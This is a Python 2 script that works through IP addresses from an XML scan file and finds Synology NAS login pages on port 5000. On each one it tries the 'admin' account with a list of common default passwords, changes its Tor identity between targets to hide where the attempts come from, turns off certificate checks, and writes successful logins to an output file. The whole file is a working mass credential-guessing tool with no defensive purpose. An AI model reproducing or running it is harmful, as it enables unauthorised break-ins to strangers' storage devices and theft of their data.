#!/usr/bin/python
import mechanize 
import itertools
import xml.etree.ElementTree as ET
import urllib2
from TorCtl import TorCtl
import urllib2
import ssl
 
user_agent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7'
headers={'User-Agent':user_agent}
 
def request(url):
    def _set_urlproxy():
        proxy_support = urllib2.ProxyHandler({"http" : "127.0.0.1:8118"})
        opener = urllib2.build_opener(proxy_support)
        urllib2.install_opener(opener)
    _set_urlproxy()
    request=urllib2.Request(url, None, headers)
    return urllib2.urlopen(request).read()
 
def renew_connection():
    conn = TorCtl.connect(controlAddr="127.0.0.1", controlPort=9051, passphrase="your_password")
    conn.send_signal("NEWNYM")
    conn.close()

passwordlist = ["","admin","1234","geheimnis","qwertz","asdf","11111111","password","passwort","gott"]
tree = ET.parse('cablecom.xml')
root = tree.getroot()

br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)

try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
        # Legacy Python that doesn't verify HTTPS certificates by default
    pass
else:
    # Handle target environment that doesn't support HTTPS verification
    ssl._create_default_https_context = _create_unverified_https_context

output=open('./output', 'w+')

for address in root.iter('address'):
    addr = address.get('addr')
    #combos = itertools.permutations("i3^4hUP-",8)
    target = "http://"+addr+":5000" 
    print target
    renew_connection()
    str_check = ""
    i=0
    while i <= 9:
        try:
            br.open(target, timeout=2)
            check = br.open(target, timeout=2)
            try:        
	        str_check = str(check.read())
            except:
	        print "String check.read failed"
	        i=10
	        str_check="String check.read failed"
	        pass
            if "SYNO" or "NAS" in str_check and i!=10:
                try:
                    br.select_form( nr = 0 )
                    br.form['username'] = "admin"
                    br.form['passwd'] = passwordlist[i]
                    print "Checking ",br.form['passwd']
                    response=br.submit()
                    result=response.info()
                    str_result=str(result)
                except:
                    i=10
                    pass
                if "id=" in str_result:
                    print "--------------Juhu--------------"
                    output.write(target+' hat  Passwort '+passwordlist[i]+' fuer User admin\n')
                    i = 10
                else:
                    if i >= 9:
                        if str_check == "String check.read failed":
                            output.write(target+' String check.read failed\n')
                        else:
                            output.write(target+' falsches Passwort\n')
                                            
                i = i+1
            else:
                print "No Synology"
        except urllib2.URLError, e:
            print "Website Timeout"
            renew_connection()
            i=10
            output.write(target+' Website Timeout\n')	
  
print "Script completed"

